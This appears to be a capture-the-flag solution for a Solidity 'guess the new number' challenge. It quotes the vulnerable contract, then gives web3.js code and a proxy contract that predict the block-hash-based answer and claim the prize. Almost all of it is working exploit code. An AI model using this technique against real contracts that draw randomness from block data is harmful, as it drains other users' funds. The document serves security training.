/*
pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
*/

async function findAnswer() {
  // https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#id57
  const [pendingBlock, latestBlockMinus1] = await Promise.all([
    web3.eth.getBlock("latest"),
    web3.eth.getBlock((await web3.eth.getBlockNumber()) - 1),
  ]);

  // solidity global env
  // https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#id57
  // blockHash bytes32: Hash of the block where this transaction was in.
  // timestamp (now alias): uint
  const latestHash = latestBlockMinus1.hash;
  const now = pendingBlock.timestamp;
  const concatHash = web3.utils.soliditySha3(
    { t: "bytes32", v: latestHash },
    { t: "uint", v: now }
  );

  // https://www.tutorialspoint.com/solidity/solidity_conversions.htm
  // uint8(bytes32) -> downcast high order bits
  const answer = parseInt(concatHash.slice(64), 16);
  console.log({
    number: latestBlockMinus1.number,
    latestHash,
    now,
    concatHash,
    answerHex: concatHash.slice(64),
    answer,
  });
  return answer;
}

async function findAnswer2() {
  const abi = [
    {
      constant: true,
      inputs: [],
      name: "getAnswer",
      outputs: [
        {
          name: "",
          type: "uint8",
        },
      ],
      payable: false,
      stateMutability: "view",
      type: "function",
      signature: "0x9c16667c",
    },
  ];

  const ctx = new web3.eth.Contract(
    abi,
    "0xB87B78c2536730b42d27ddb93564f92305f252f3"
  );
  return ctx.methods.getAnswer().call();
}

const abi = [
  {
    constant: false,
    inputs: [
      {
        name: "n",
        type: "uint8",
      },
    ],
    name: "guess",
    outputs: [],
    payable: true,
    stateMutability: "payable",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "isComplete",
    outputs: [
      {
        name: "",
        type: "bool",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    payable: true,
    stateMutability: "payable",
    type: "constructor",
  },
];

guessCt = new web3.eth.Contract(
  abi,
  "0xCf37b56430300526d8D02080D586a4daF9013671"
);

payValue = web3.utils.toWei("1");
const answer = await findAnswer2();
guessCt.methods.guess(answer).send({
  from: "0x244CD9c888C03C26c41f58C851d53cEff47d224E",
  value: payValue,
});

//---------------------------------
// Solution - using proxy
/*
contract Proxy {
    address payable public owner;
    constructor(address payable _owner) {
        owner = _owner;
    }
   

    receive() external payable {
        // send all Ether to owner
        // Owner can receive Ether since the address of owner is payable
        // (bool success, ) = owner.call{value: msg.value}("");
        // require(success, "Failed to send Ether");
    }
    
     function proxyGuess(address payable _addr) public payable {
         uint8 answer = uint8( 
             uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))
             );
         (bool success, bytes memory data) = _addr.call{value: msg.value, gas: 5000*5}(
            abi.encodeWithSignature("guess(uint8)", answer)
        );
        require(success, "Failed to call");
     }
}

*/

async function proxyCall() {
  const abi = [
    {
      inputs: [
        {
          internalType: "address payable",
          name: "_addr",
          type: "address",
        },
      ],
      name: "proxyGuess",
      outputs: [],
      stateMutability: "payable",
      type: "function",
    },
  ];

  // Proxy ctx
  const ctx = new web3.eth.Contract(
    abi,
    "0x27ecF58B12e45dDa805711E8C207a954Eb5a557D"
  );
  const target = "0x1a17C986B6FCE090c4F11fB8E7DcC904dBc133b2";

  const res = await ctx.methods.proxyGuess(target).send({
    from: account.address,
    value: web3.utils.toWei("1", "ether"),
    gasLimit: 21204 * 6,
  });
  console.log(res);
}
